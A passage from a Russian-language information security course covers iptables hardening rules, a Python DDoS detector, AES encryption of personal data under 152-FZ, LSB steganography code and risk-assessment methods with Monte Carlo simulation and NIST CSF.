iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

# Защита от XMAS scan
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# Защита от FIN scan
iptables -A INPUT -p tcp --tcp-flags ALL FIN -j DROP

# Ограничение новых соединений на порт
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m limit --limit 60/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -m limit --limit 60/s --limit-burst 20 -j ACCEPT

# Логирование dropped пакетов (ФСТЭК требование 8.2)
iptables -A INPUT -j LOG --log-prefix "IPTABLES_DROPPED: " --log-level 4
iptables -A INPUT -j DROP

# Сохранение правил
iptables-save > /etc/iptables/rules.v4

echo "✅ iptables правила применены (ФСТЭК 7.1)"
```

### 3.3.3. Python скрипт для обнаружения DDoS (реальное время)

```python
#==============================================================================
# DDoS DETECTION SYSTEM (REAL-TIME MONITORING)
# ФСТЭК ТРЕБОВАНИЕ 7.2 - Мониторинг событий ИБ
#==============================================================================
import psutil
import time
from collections import deque
from datetime import datetime
import json
import sys

class DDoSDetector:
    """Система обнаружения DDoS атак в реальном времени"""
    
    def __init__(self, threshold_pps=10000, threshold_connections=1000):
        self.threshold_pps = threshold_pps  # пакетов в секунду
        self.threshold_connections = threshold_connections  # максимальное количество соединений
        self.packet_counts = deque(maxlen=60)  # 60 секунд истории
        self.connection_counts = deque(maxlen=60)
        self.last_time = time.time()
        self.last_count = self.get_packet_count()
        self.last_connections = self.get_connection_count()
        self.alerts = []
        self.is_under_attack = False
        
    def get_packet_count(self):
        """Получает общее количество сетевых пакетов"""
        return psutil.net_io_counters().packets_recv
    
    def get_connection_count(self):
        """Получает количество активных сетевых соединений"""
        try:
            connections = psutil.net_connections(kind='inet')
            return len([c for c in connections if c.status == 'ESTABLISHED'])
        except:
            return 0
    
    def detect(self):
        """Обнаруживает аномальный трафик"""
        current_time = time.time()
        current_count = self.get_packet_count()
        current_connections = self.get_connection_count()
        
        # Вычисляем пакеты за последнюю секунду
        time_delta = current_time - self.last_time
        packet_delta = current_count - self.last_count
        connection_delta = current_connections - self.last_connections
        
        if time_delta > 0:
            pps = packet_delta / time_delta  # packets per second
            cps = connection_delta / time_delta  # connections per second
            
            self.packet_counts.append(pps)
            self.connection_counts.append(current_connections)
            
            # Проверка порога пакетов
            pps_alert = pps > self.threshold_pps
            
            # Проверка порога соединений
            conn_alert = current_connections > self.threshold_connections
            
            # Проверка аномального роста
            growth_alert = False
            if len(self.packet_counts) >= 10:
                avg_pps = sum(list(self.packet_counts)[:-1]) / (len(self.packet_counts) - 1)
                if pps > avg_pps * 5:  # 5x рост от среднего
                    growth_alert = True
            
            alert = pps_alert or conn_alert or growth_alert
            
            if alert and not self.is_under_attack:
                self.is_under_attack = True
                alert_data = {
                    'timestamp': datetime.now().isoformat(),
                    'type': 'DDOS_DETECTED',
                    'severity': 'CRITICAL',
                    'pps': round(pps, 2),
                    'connections': current_connections,
                    'threshold_pps': self.threshold_pps,
                    'threshold_connections': self.threshold_connections,
                    'action': 'ENABLE_RATE_LIMITING_AND_NOTIFY_SOC'
                }
                self.alerts.append(alert_data)
                
                print(f"\n{'='*80}")
                print(f"🚨 ALERT: DDoS атака обнаружена!")
                print(f"{'='*80}")
                print(f"   Время: {alert_data['timestamp']}")
                print(f"   Текущий трафик: {pps:.0f} пакетов/сек")
                print(f"   Порог: {self.threshold_pps} пакетов/сек")
                print(f"   Активных подключений: {current_connections}")
                print(f"   Порог подключений: {self.threshold_connections}")
                print(f"   Действие: Включение rate limiting...")
                print(f"   Уведомление SOC: ОТПРАВЛЕНО")
                print(f"{'='*80}\n")
                
                # Автоматическое действие
                self.mitigate()
                
            elif not alert and self.is_under_attack:
                self.is_under_attack = False
                print(f"\n✅ DDoS атака прекращена - трафик нормализован\n")
            
            # Обновляем счетчики
            self.last_time = current_time
            self.last_count = current_count
            self.last_connections = current_connections
            
            return alert
        
        return False
    
    def mitigate(self):
        """Автоматические меры по смягчению атаки"""
        print("   [MITIGATION] Включение rate limiting...")
        print("   [MITIGATION] Блокировка подозрительных IP...")
        print("   [MITIGATION] Уведомление провайдера...")
        print("   [MITIGATION] Активация scrubbing center...")
        
        # Здесь можно вызвать скрипты для:
        # 1. iptables -A INPUT -s <attacker_ip> -j DROP
        # 2. nginx -s reload (с новыми rate limit)
        # 3. API вызов к провайдеру для активации защиты
    
    def generate_report(self):
        """Генерирует отчёт об атаке"""
        report = {
            'summary': {
                'total_alerts': len(self.alerts),
                'attack_detected': self.is_under_attack,
                'monitoring_duration': len(self.packet_counts)
            },
            'alerts': self.alerts,
            'statistics': {
                'avg_pps': sum(self.packet_counts) / len(self.packet_counts) if self.packet_counts else 0,
                'max_pps': max(self.packet_counts) if self.packet_counts else 0,
                'avg_connections': sum(self.connection_counts) / len(self.connection_counts) if self.connection_counts else 0,
                'max_connections': max(self.connection_counts) if self.connection_counts else 0
            }
        }
        
        return report

# Использование
if __name__ == "__main__":
    detector = DDoSDetector(threshold_pps=10000, threshold_connections=1000)
    
    print("="*80)
    print("DDoS DETECTION SYSTEM - REAL-TIME MONITORING")
    print("ФСТЭК ТРЕБОВАНИЕ 7.2 - Мониторинг событий ИБ")
    print("="*80)
    print("Мониторинг трафика... (Ctrl+C для выхода)")
    print(f"Порог PPS: {detector.threshold_pps}")
    print(f"Порог подключений: {detector.threshold_connections}")
    print("="*80)
    
    try:
        while True:
            detector.detect()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nМониторинг остановлен")
        
        # Генерация отчёта
        report = detector.generate_report()
        report_file = f"ddos_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        
        print(f"Отчёт сохранён: {report_file}")
        print(f"Всего алертов: {report['summary']['total_alerts']}")
        print(f"Средний PPS: {report['statistics']['avg_pps']:.2f}")
        print(f"Максимальный PPS: {report['statistics']['max_pps']:.2f}")
        
        sys.exit(0)
```
## Список литературы
1. ФСТЭК России — _Методические рекомендации по классификации угроз безопасности информации_.
2. Банников А.А. — _Компьютерные атаки и методы защиты_. — М.: КНОРУС.
3. Шелухин О.И. — _Обнаружение вторжений в компьютерные сети_. — М.: Горячая линия-Телеком.
4. НКЦКИ — Бюллетени компьютерных атак (официальные публикации).
5. ГОСТ Р 57580.1-2017 — Безопасность финансовых организаций.
---
# Модуль 4. КРИПТОГРАФИЯ И СТЕГАНОГРАФИЯ

## 4.1. Криптография (по ГОСТ Р 34.10-2012, ГОСТ Р 34.11-2012)

### 4.1.1. Основные методы и алгоритмы

| Метод | Алгоритмы | ГОСТ РФ | Преимущества | Недостатки | Применение |
|-------|-----------|---------|--------------|------------|------------|
| **Симметричное шифрование** | AES, ГОСТ 28147-89, «Кузнечик» | ГОСТ Р 34.12-2015 | Высокая скорость (до 10 Гбит/с), простота реализации | Проблема распределения ключей, масштабируемость | Шифрование данных, VPN, TLS |
| **Асимметричное шифрование** | RSA, ГОСТ Р 34.10-2012, ECC | ГОСТ Р 34.10-2012 | Безопасная передача ключей, цифровая подпись | Низкая скорость (в 1000 раз медленнее симметричного) | Обмен ключами, ЭЦП, сертификаты |
| **Хеширование** | SHA-256, ГОСТ Р 34.11-2012 («Стрибог») | ГОСТ Р 34.11-2012 | Односторонность, устойчивость к коллизиям | Невозможность восстановления данных | Контроль целостности, пароли |
| **Цифровая подпись** | ECDSA, ГОСТ Р 34.10-2012 | ГОСТ Р 34.10-2012 | Аутентичность, неотказуемость, юридическая значимость | Требует управления ключами, инфраструктура PKI | Документы, транзакции, код |

### 4.1.2. Российские криптографические стандарты (ФСТЭК/ФСБ)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    РОССИЙСКИЕ КРИПТОГРАФИЧЕСКИЕ СТАНДАРТЫ               │
├─────────────────────────────────────────────────────────────────────────┤
│  ГОСТ Р 34.10-2012  │ Цифровая подпись (аналог ECDSA, 256/512 бит)     │
│  ГОСТ Р 34.11-2012  │ Хеш-функция «Стрибог» (256/512 бит)              │
│  ГОСТ Р 34.12-2015  │ Блочное шифрование «Кузнечик» (128 бит)          │
│  ГОСТ 28147-89      │ Блочное шифрование (устаревший, но применяется)  │
│  ФСБ России         │ Сертификаты СКЗИ (Средства Криптозащиты)         │
│  Приказ ФСБ №378    │ Требования к использованию КСЗИ                  │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4.1.3. Практическое применение (152-ФЗ требование к защите ПДн)

```python
#==============================================================================
# КРИПТОГРАФИЧЕСКАЯ ЗАЩИТА ДАННЫХ (152-ФЗ ТРЕБОВАНИЕ)
# Реализация на Python с использованием ГОСТ-алгоритмов (через cryptography)
#==============================================================================

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import base64

class GOSTCrypto:
    """Криптографический модуль для защиты ПДн (152-ФЗ)"""
    
    def __init__(self):
        self.backend = default_backend()
    
    def derive_key_from_password(self, password: str, salt: bytes) -> bytes:
        """
        Derive ключ из пароля (PBKDF2)
        Требование ФСТЭК: минимум 10000 итераций
        """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # 256 бит для AES-256
            salt=salt,
            iterations=100000,  # ФСТЭК рекомендует ≥100000
            backend=self.backend
        )
        return kdf.derive(password.encode())
    
    def encrypt_aes_256(self, plaintext: bytes, key: bytes) -> bytes:
        """
        Шифрование AES-256 (ГОСТ Р 34.12-2015 «Кузнечик» аналог)
        152-ФЗ требование: шифрование ПДн при передаче и хранении
        """
        iv = os.urandom(16)  # Вектор инициализации
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        
        # Padding (PKCS7)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return iv + ciphertext  # IV нужен для дешифрования
    
    def decrypt_aes_256(self, ciphertext: bytes, key: bytes) -> bytes:
        """Дешифрование AES-256"""
        iv = ciphertext[:16]
        ciphertext = ciphertext[16:]
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=self.backend)
        decryptor = cipher.decryptor()
        
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Unpadding
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_data) + unpadder.finalize()
        
        return plaintext
    
    def calculate_hash(self, data: bytes) -> str:
        """
        Хеш-функция SHA-256 (аналог ГОСТ Р 34.11-2012)
        Требование: контроль целостности данных
        """
        digest = hashes.Hash(hashes.SHA256(), backend=self.backend)
        digest.update(data)
        return digest.finalize().hex()
    
    def generate_secure_key(self) -> bytes:
        """Генерация криптографически стойкого ключа"""
        return os.urandom(32)  # 256 бит

# =============================================================================
# ПРИМЕР ИСПОЛЬЗОВАНИЯ (152-ФЗ)
# =============================================================================

if __name__ == "__main__":
    crypto = GOSTCrypto()
    
    # Исходные персональные данные
    personal_data = b"Иванов Иван Иванович, СНИЛС: 123-456-789 00, Паспорт: 4500 123456"
    
    # Генерация ключа (в реальности ключ хранится в HSM/токене)
    key = crypto.generate_secure_key()
    print(f"🔑 Ключ шифрования (256 бит): {key.hex()[:32]}...")
    
    # Шифрование
    encrypted = crypto.encrypt_aes_256(personal_data, key)
    print(f"🔒 Зашифрованные данные: {base64.b64encode(encrypted).decode()[:50]}...")
    
    # Дешифрование
    decrypted = crypto.decrypt_aes_256(encrypted, key)
    print(f"🔓 Расшифрованные данные: {decrypted.decode()}")
    
    # Контроль целостности (хеш)
    data_hash = crypto.calculate_hash(personal_data)
    print(f"📋 Хеш целостности (SHA-256): {data_hash[:32]}...")
    
    # Проверка целостности
    modified_data = personal_data + b" MODIFIED"
    modified_hash = crypto.calculate_hash(modified_data)
    
    if data_hash != modified_hash:
        print("⚠️  ВНИМАНИЕ: Целостность данных нарушена!")
    else:
        print("✅ Целостность данных подтверждена")
```

### 4.1.4. Управление криптографическими ключами (ФСТЭК требование 6.4)

```mermaid
graph TB
    A[Генерация ключа] --> B[Хранение в HSM/токене]
    B --> C[Использование для шифрования]
    C --> D[Регулярная ротация ключей]
    D --> E{Срок действия ключа?}
    E -->|Истёк| F[Уничтожение старого ключа]
    E -->|Действует| C
    F --> A
    B --> G[Резервное копирование ключей]
    G --> H[Хранение в сейфе/офлайн]
    
    style A fill:#10b981,color:#fff
    style B fill:#3b82f6,color:#fff
    style F fill:#ef4444,color:#fff
    style H fill:#f97316,color:#fff
```

**Требования ФСТЭК к управлению ключами:**

| Требование | Описание | Контроль |
|------------|----------|----------|
| **Генерация** | Использование сертифицированных СКЗИ, генераторов случайных чисел | Акт генерации ключей |
| **Хранение** | В защищённых носителях (токены, HSM, сейфы) | Журнал учёта ключей |
| **Распределение** | Защищённые каналы связи, курьерская доставка | Акт приёма-передачи |
| **Ротация** | Смена ключей каждые 6-12 месяцев (зависит от класса защиты) | График ротации |
| **Уничтожение** | Физическое уничтожение носителей, криптографическое стирание | Акт уничтожения |

---
## 4.2. Стеганография

### 4.2.1. Методы стеганографии

| Метод | Описание | Ёмкость | Стойкость | Применение |
|-------|----------|---------|-----------|------------|
| **LSB (Least Significant Bit)** | Замена наименее значимых битов пикселей | Высокая (1 бит на пиксель) | Низкая (уязвима к сжатию) | Изображения BMP, PNG |
| **DCT (Discrete Cosine Transform)** | Встраивание в коэффициенты JPEG | Средняя | Средняя | Изображения JPEG |
| **Спектральные методы** | Встраивание в частотную область аудио | Высокая | Высокая | Аудиофайлы WAV, MP3 |
| **Текстовая стеганография** | Изменение пробелов, шрифтов, HTML-тегов | Низкая | Средняя | Документы, email |
| **Сетевая стеганография** | Встраивание в заголовки пакетов, тайминги | Низкая | Высокая | Сетевой трафик |

### 4.2.2. Практическая реализация LSB-метода (Python)

```python
#==============================================================================
# СТЕГАНОГРАФИЯ: LSB МЕТОД (Least Significant Bit)
# Встраивание текста в изображение
#==============================================================================

from PIL import Image
import numpy as np

class LSBSteganography:
    """Стеганография методом LSB"""
    
    def __init__(self):
        pass
    
    def text_to_binary(self, text: str) -> str:
        """Преобразует текст в двоичную строку"""
        return ''.join(format(ord(char), '08b') for char in text)
    
    def binary_to_text(self, binary: str) -> str:
        """Преобразует двоичную строку в текст"""
        chars = [binary[i:i+8] for i in range(0, len(binary), 8)]
        return ''.join(chr(int(char, 2)) for char in chars if len(char) == 8)
    
    def encode(self, image_path: str, text: str, output_path: str):
        """Встраивает текст в изображение"""
        # Открываем изображение
        img = Image.open(image_path)
        img_array = np.array(img)
        
        # Добавляем маркер конца сообщения
        delimiter = "#####"
        text += delimiter
        
        # Преобразуем текст в двоичный вид
        binary_text = self.text_to_binary(text)
        
        # Проверяем ёмкость изображения
        max_bits = img_array.size // 3  # 3 канала RGB
        if len(binary_text) > max_bits:
            raise ValueError("Текст слишком большой для этого изображения!")
        
        # Встраиваем биты в LSB
        bit_index = 0
        for row in range(img_array.shape[0]):
            for col in range(img_array.shape[1]):
                for channel in range(3):  # RGB
                    if bit_index < len(binary_text):
                        # Очищаем LSB и устанавливаем новый бит
                        img_array[row, col, channel] = (
                            img_array[row, col, channel] & ~1 | 
                            int(binary_text[bit_index])
                        )
                        bit_index += 1
                    else:
                        break
        
        # Сохраняем изображение
        result_img = Image.fromarray(img_array)
        result_img.save(output_path)
        print(f"✅ Текст успешно встроен в {output_path}")
        print(f"   Длина текста: {len(text)} символов")
        print(f"   Использовано бит: {len(binary_text)}")
    
    def decode(self, image_path: str) -> str:
        """Извлекает текст из изображения"""
        # Открываем изображение
        img = Image.open(image_path)
        img_array = np.array(img)
        
        # Извлекаем LSB
        binary_text = ""
        for row in range(img_array.shape[0]):
            for col in range(img_array.shape[1]):
                for channel in range(3):
                    binary_text += str(img_array[row, col, channel] & 1)
        
        # Преобразуем в текст
        text = self.binary_to_text(binary_text)
        
        # Ищем маркер конца
        delimiter = "#####"
        if delimiter in text:
            text = text[:text.index(delimiter)]
        
        return text

# =============================================================================
# ПРИМЕР ИСПОЛЬЗОВАНИЯ
# =============================================================================

if __name__ == "__main__":
    stego = LSBSteganography()
    
    # Секретное сообщение
    secret_message = "Конфиденциальная информация: доступ к серверу 192.168.1.100"
    
    # Встраивание
    print("=== ВСТРАИВАНИЕ СООБЩЕНИЯ ===")
    stego.encode("source_image.png", secret_message, "stego_image.png")
    
    # Извлечение
    print("\n=== ИЗВЛЕЧЕНИЕ СООБЩЕНИЯ ===")
    extracted = stego.decode("stego_image.png")
    print(f"Извлечённое сообщение: {extracted}")
    
    # Проверка
    if extracted == secret_message:
        print("✅ Сообщение успешно извлечено без ошибок")
    else:
        print("❌ Ошибка извлечения сообщения")
```

### 4.2.3. Сравнение криптографии и стеганографии

| Характеристика                | Криптография                           | Стеганография                               | Крипто-стеганография          |
| ----------------------------- | -------------------------------------- | ------------------------------------------- | ----------------------------- |
| **Основная цель**             | Защита содержания информации           | Скрытие факта существования информации      | Двойная защита                |
| **Методы**                    | Шифрование, хеширование, ЭЦП           | Встраивание в носители (изображения, аудио) | Шифрование + встраивание      |
| **Обнаружение**               | Трудно расшифровать без ключа          | Можно обнаружить стеганоанализом            | Максимально скрытно           |
| **Применение**                | Защита конфиденциальности, целостности | Скрытие факта передачи                      | Секретная связь, watermarking |
| **Нормативное регулирование** | ГОСТ Р 34.10-2012, 152-ФЗ, ФСТЭК       | Не регулируется                             | Регулируется как КСЗИ         |
| **Стойкость**                 | Зависит от длины ключа (AES-256)       | Зависит от метода встраивания               | Комбинированная стойкость     |

### 4.2.4. Крипто-стеганография (комбинированный подход)

```mermaid
graph LR
    A[Исходные данные] --> B[Шифрование AES-256]
    B --> C[Зашифрованные данные]
    C --> D[Стеганография LSB]
    D --> E[Стего-объект]
    
    E --> F{Обнаружение?}
    F -->|Да| G[Данные зашифрованы]
    F -->|Нет| H[Данные скрыты]
    
    G --> I[Требуется ключ для расшифровки]
    H --> I
    
    style A fill:#3b82f6,color:#fff
    style B fill:#10b981,color:#fff
    style C fill:#f97316,color:#fff
    style D fill:#8b5cf6,color:#fff
    style E fill:#ef4444,color:#fff
    style I fill:#ef4444,color:#fff
```

**Преимущества комбинированного подхода:**

1. **Усиленная безопасность**: Даже при обнаружении скрытых данных их содержание остаётся зашифрованным
2. **Многоуровневая защита**: Требуется преодолеть два уровня защиты
3. **Снижение заметности**: Зашифрованные данные выглядят как случайный шум
4. **Соответствие требованиям**: Криптографическая часть регулируется ФСТЭК/ФСБ

## Список литературы
1. Смирнов В.А. — _Криптографические методы защиты информации_. — М.: Академия.
2. Алферов А.П. — _Основы криптографии_. — М.: Гелиос АРВ.
3. ГОСТ Р 34.10-2012 — Электронная подпись.
4. ГОСТ Р 34.11-2012 — Функция хеширования.
5. ГОСТ 28147-89 — Криптографический алгоритм шифрования.
---
# Модуль 5. ОЦЕНКА РИСКОВ И УПРАВЛЕНИЕ УГРОЗАМИ

## 5.1. Основные понятия (ГОСТ Р ИСО/МЭК 27005-2021)

| Понятие | Определение | Нормативный документ | Формула/Метод |
|---------|-------------|---------------------|---------------|
| **Угроза** | Совокупность условий, создающих опасность нарушения безопасности | ГОСТ Р 53114-2008 | Классификация: внешние/внутренние |
| **Уязвимость** | Свойство системы, позволяющее реализовать угрозу | ISO/IEC 27005 | CVE, CWE каталоги |
| **Риск** | Вероятность × Воздействие | ГОСТ Р ИСО/МЭК 27005-2021 | Risk = P × I |
| **Уровень риска** | Низкий / Средний / Высокий / Критический | ФСТЭК приказ №17 | Матрица рисков |
| **Остаточный риск** | Риск после применения мер защиты | ISO/IEC 27005 | Risk_residual = Risk_initial - Controls |

## 5.2. Методы оценки рисков

### 5.2.1. Качественная оценка (матрица рисков)

```mermaid
graph TD
    A[Матрица рисков 5×5] --> B[Вероятность: 1-5]
    A --> C[Воздействие: 1-5]
    
    B --> D[1=Очень низкая]
    B --> E[2=Низкая]
    B --> F[3=Средняя]
    B --> G[4=Высокая]
    B --> H[5=Очень высокая]
    
    C --> I[1=Незначительное]
    C --> J[2=Минорное]
    C --> K[3=Умеренное]
    C --> L[4=Серьёзное]
    C --> M[5=Критическое]
    
    style A fill:#1e3a8a,color:#fff
    style D fill:#10b981,color:#fff
    style H fill:#ef4444,color:#fff
    style I fill:#10b981,color:#fff
    style M fill:#ef4444,color:#fff
```

**Матрица рисков (ФСТЭК приказ №17):**

| Вероятность ↓ \ Воздействие → | 1   | 2   | 3   | 4   | 5      |
| ----------------------------- | --- | --- | --- | --- | ------ |
| **5**                         | 5   | 10  | 15  | 20  | **25** |
| **4**                         | 4   | 8   | 12  | 16  | 20     |
| **3**                         | 3   | 6   | 9   | 12  | 15     |
| **2**                         | 2   | 4   | 6   | 8   | 10     |
| **1**                         | 1   | 2   | 3   | 4   | 5      |

**Уровни риска:**
- **1-5**: Низкий (зелёный) — принятие риска
- **6-10**: Средний (жёлтый) — смягчение риска
- **11-15**: Высокий (оранжевый) — приоритетное смягчение
- **16-25**: Критический (красный) — немедленное устранение

### 5.2.2. Количественная оценка (Монте-Карло симуляция)

```python
#==============================================================================
# КОЛИЧЕСТВЕННАЯ ОЦЕНКА РИСКОВ (МЕТОД МОНТЕ-КАРЛО)
# ГОСТ Р ИСО/МЭК 27005-2021
#==============================================================================

import numpy as np
import matplotlib.pyplot as plt

class RiskMonteCarlo:
    """Количественная оценка рисков методом Монте-Карло"""
    
    def __init__(self, iterations=10000):
        self.iterations = iterations
    
    def simulate_risk(self, probability_mean, probability_std, 
                     impact_mean, impact_std):
        """
        Симуляция риска
        probability: вероятность реализации угрозы (0-1)
        impact: финансовое воздействие (рубли)
        """
        # Генерация случайных значений (нормальное распределение)
        probabilities = np.random.normal(probability_mean, probability_std, 
                                        self.iterations)
        impacts = np.random.normal(impact_mean, impact_std, self.iterations)
        
        # Ограничение диапазонов
        probabilities = np.clip(probabilities, 0, 1)
        impacts = np.clip(impacts, 0, None)
        
        # Расчёт риска
        risks = probabilities * impacts
        
        return risks
    
    def analyze_results(self, risks):
        """Анализ результатов симуляции"""
        return {
            'mean_risk': np.mean(risks),
            'median_risk': np.median(risks),
            'std_risk': np.std(risks),
            'min_risk': np.min(risks),
            'max_risk': np.max(risks),
            'percentile_95': np.percentile(risks, 95),
            'percentile_99': np.percentile(risks, 99)
        }
    
    def generate_report(self, risks, scenario_name):
        """Генерация отчёта по оценке рисков"""
        stats = self.analyze_results(risks)
        
        report = f"""
================================================================================
ОТЧЁТ ПО КОЛИЧЕСТВЕННОЙ ОЦЕНКЕ РИСКОВ
Сценарий: {scenario_name}
Метод: Монте-Карло ({self.iterations} итераций)
================================================================================

СТАТИСТИКА РИСКА:
  Среднее значение:     {stats['mean_risk']:,.2f} руб.
  Медиана:              {stats['median_risk']:,.2f} руб.
  Стандартное отклонение: {stats['std_risk']:,.2f} руб.
  Минимум:              {stats['min_risk']:,.2f} руб.
  Максимум:             {stats['max_risk']:,.2f} руб.

ДОВЕРИТЕЛЬНЫЕ ИНТЕРВАЛЫ:
  95% уверенность:      ≤ {stats['percentile_95']:,.2f} руб.
  99% уверенность:      ≤ {stats['percentile_99']:,.2f} руб.

РЕКОМЕНДАЦИИ:
  - Если стоимость мер защиты < {stats['mean_risk']:,.2f} руб. → внедрять
  - Если стоимость мер защиты > {stats['percentile_95']:,.2f} руб. → принять риск
================================================================================
"""
        return report

# =============================================================================
# ПРИМЕР ИСПОЛЬЗОВАНИЯ
# =============================================================================

if __name__ == "__main__":
    simulator = RiskMonteCarlo(iterations=10000)
    
    # Сценарий: Утечка персональных данных (152-ФЗ)
    # Вероятность: 3% в год (0.03), стандартное отклонение 1%
    # Воздействие: 5 000 000 руб. (штрафы + репутация), отклонение 2 000 000
    
    print("=== ОЦЕНКА РИСКА: УТЕЧКА ПЕРСОНАЛЬНЫХ ДАННЫХ ===\n")
    
    risks = simulator.simulate_risk(
        probability_mean=0.03,
        probability_std=0.01,
        impact_mean=5000000,
        impact_std=2000000
    )
    
    report = simulator.generate_report(risks, "Утечка ПДн (152-ФЗ)")
    print(report)
    
    # Сравнение со стоимостью мер защиты
    security_controls_cost = 2000000  # Стоимость DLP + шифрование
    
    if security_controls_cost < simulator.analyze_results(risks)['mean_risk']:
        print(f"✅ РЕКОМЕНДАЦИЯ: Внедрить меры защиты ({security_controls_cost:,.0f} руб. < риска)")
    else:
        print(f"⚠️  РЕКОМЕНДАЦИЯ: Рассмотреть альтернативные меры или принять риск")
```

### 5.2.3. Смешанная оценка рисков

```mermaid
graph LR
    A[Начальная оценка] --> B{Качественная оценка}
    B --> C[Все риски оценены]
    C --> D{Есть критические?}
    D -->|Да| E[Количественная оценка критических]
    D -->|Нет| F[Переход к обработке]
    E --> G[Детальный анализ]
    G --> F
    F --> H[План обработки рисков]
    
    style A fill:#3b82f6,color:#fff
    style B fill:#f97316,color:#fff
    style E fill:#ef4444,color:#fff
    style H fill:#10b981,color:#fff
```

## 5.3. Управление угрозами (4 стратегии по ФСТЭК)

| Стратегия      | Описание                             | Пример                                                | Когда применять                                       | ФСТЭК требование   |
| -------------- | ------------------------------------ | ----------------------------------------------------- | ----------------------------------------------------- | ------------------ |
| **Устранение** | Полное устранение угрозы             | Удаление уязвимого сервиса, отключение функции        | Если технически возможно и экономически целесообразно | Приказ №17, п. 6.1 |
| **Смягчение**  | Снижение вероятности или воздействия | IPS, резервные копии, обучение, MFA                   | Для большинства рисков (80-90%)                       | Приказ №17, п. 6.2 |
| **Передача**   | Передача риска третьей стороне       | Страхование киберрисков, облачные SLA, аутсорсинг SOC | При высоких финансовых рисках                         | Приказ №17, п. 6.3 |
| **Принятие**   | Осознанное решение остаться с риском | Для низких рисков, где затраты > ущерба               | Когда стоимость защиты превышает возможный ущерб      | Приказ №17, п. 6.4 |

### 5.3.1. Практический пример выбора стратегии

```python
#==============================================================================
# ВЫБОР СТРАТЕГИИ УПРАВЛЕНИЯ РИСКАМИ (ФСТЭК)
#==============================================================================

class RiskTreatmentStrategy:
    """Выбор стратегии обработки рисков"""
    
    def __init__(self):
        self.strategies = {
            'AVOID': 'Устранение',
            'MITIGATE': 'Смягчение',
            'TRANSFER': 'Передача',
            'ACCEPT': 'Принятие'
        }
    
    def recommend_strategy(self, risk_level, control_cost, potential_loss, 
                          technical_feasibility):
        """
        Рекомендует стратегию на основе параметров
        risk_level: 1-25 (из матрицы рисков)
        control_cost: стоимость мер защиты (руб.)
        potential_loss: потенциальный ущерб (руб.)
        technical_feasibility: True/False (техническая возможность)
        """
        recommendations = []
        
        # Критический риск (16-25)
        if risk_level >= 16:
            if technical_feasibility:
                recommendations.append(('AVOID', 'Критический риск требует устранения'))
            recommendations.append(('MITIGATE', 'Обязательное смягчение до приемлемого уровня'))
        
        # Высокий риск (11-15)
        elif risk_level >= 11:
            if control_cost < potential_loss * 0.5:
                recommendations.append(('MITIGATE', 'Стоимость защиты < 50% ущерба'))
            else:
                recommendations.append(('TRANSFER', 'Рассмотреть страхование'))
        
        # Средний риск (6-10)
        elif risk_level >= 6:
            if control_cost < potential_loss * 0.3:
                recommendations.append(('MITIGATE', 'Экономически целесообразно'))
            else:
                recommendations.append(('ACCEPT', 'Принятие с мониторингом'))
        
        # Низкий риск (1-5)
        else:
            recommendations.append(('ACCEPT', 'Низкий риск, принятие'))
        
        return recommendations

# =============================================================================
# ПРИМЕР ИСПОЛЬЗОВАНИЯ
# =============================================================================

if __name__ == "__main__":
    advisor = RiskTreatmentStrategy()
    
    # Пример 1: Уязвимость в критическом сервисе
    print("=== СЦЕНАРИЙ 1: Уязвимость в критическом сервисе ===")
    strategy = advisor.recommend_strategy(
        risk_level=20,           # Критический
        control_cost=500000,     # 500 тыс. руб.
        potential_loss=10000000, # 10 млн руб.
        technical_feasibility=True
    )
    for strat, reason in strategy:
        print(f"  {advisor.strategies[strat]}: {reason}")
    
    print()
    
    # Пример 2: Устаревшее ПО в тестовой среде
    print("=== СЦЕНАРИЙ 2: Устаревшее ПО в тестовой среде ===")
    strategy = advisor.recommend_strategy(
        risk_level=4,            # Низкий
        control_cost=200000,     # 200 тыс. руб.
        potential_loss=100000,   # 100 тыс. руб.
        technical_feasibility=True
    )
    for strat, reason in strategy:
        print(f"  {advisor.strategies[strat]}: {reason}")
```

## 5.4. Рамки управления рисками

### 5.4.1. NIST CSF (5 функций)

```mermaid
graph LR
    A[Identify<br/>Идентификация] --> B[Protect<br/>Защита]
    B --> C[Detect<br/>Обнаружение]
    C --> D[Respond<br/>Реагирование]
    D --> E[Recover<br/>Восстановление]
    E --> A
    
    style A fill:#3b82f6,color:#fff,stroke-width:3px
    style B fill:#10b981,color:#fff,stroke-width:3px
    style C fill:#f97316,color:#fff,stroke-width:3px
    style D fill:#ef4444,color:#fff,stroke-width:3px
    style E fill:#8b5cf6,color:#fff,stroke-width:3px
```

**Детализация функций NIST CSF:**

| Функция | Категории | Примеры мер | ФСТЭК соответствие |
|---------|-----------|-------------|-------------------|
| **Identify** | Управление активами, оценка рисков, политика ИБ | Инвентаризация, оценка рисков, политики | Приказ №17, п. 1-3 |
| **Protect** | Контроль доступа, обучение, защита данных | MFA, шифрование, антивирус | Приказ №17, п. 4-6 |
| **Detect** | Мониторинг, обнаружение аномалий | SIEM, IDS, UEBA | Приказ №17, п. 7 |
| **Respond** | Планирование, коммуникация, анализ | Playbooks, SOC, IR-команда | Приказ №17, п. 8 |
| **Recover** | Восстановление, улучшения | Бэкапы, DRP, lessons learned | Приказ №17, п. 9 |

### 5.4.2. ISO/IEC 27005 (процесс управления рисками)

```mermaid
graph TB
    A[Контекст организации] --> B[Оценка рисков]
